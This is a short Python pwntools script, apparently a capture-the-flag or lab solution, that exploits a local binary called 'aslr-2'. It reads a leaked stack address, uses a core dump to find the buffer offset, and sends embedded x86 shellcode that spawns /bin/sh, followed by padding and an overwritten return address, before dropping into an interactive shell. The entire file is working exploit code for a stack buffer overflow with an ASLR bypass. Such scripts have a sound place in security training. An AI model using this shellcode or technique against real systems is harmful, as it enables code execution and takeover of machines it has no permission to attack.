#!/usr/bin/env python

from pwn import *
import os

p = process('./aslr-2')
#gdb.attach(p)

shellcode = 'j2X\xcd\x80PP[YjGX\xcd\x801\xc91\xd2j\x0bX\x99Rhn/shh//biT[\xcd\x80'

#get the leaked address
line = p.recvline()
line2 = p.recvline()
#print(line2)
addresses = line2.split(' ')
#print(addresses[4])

#get core buff address
buf = 'A'*0x100
if not os.path.exists('core'):
    p.sendline(buf)
    p.wait()
c = Core('./core')

buffer_addr = c.stack.find(buf)
#print(hex(buffer_addr))

#get offset
leaked_int = int(addresses[5],16)
offset = buffer_addr - leaked_int
print(offset)

####################################################
#leak address
p = process('./aslr-2')
line3 = p.recvline()
line4 = p.recvline()
#print(line4)
addresses2 = line4.split(' ')
leaked_int2 = int(addresses2[5],16)
found = leaked_int2 + offset
string = shellcode + "A"*(0x88 - len(shellcode)) + "AAAA" + p32(found)


p.sendline(string)
p.interactive()

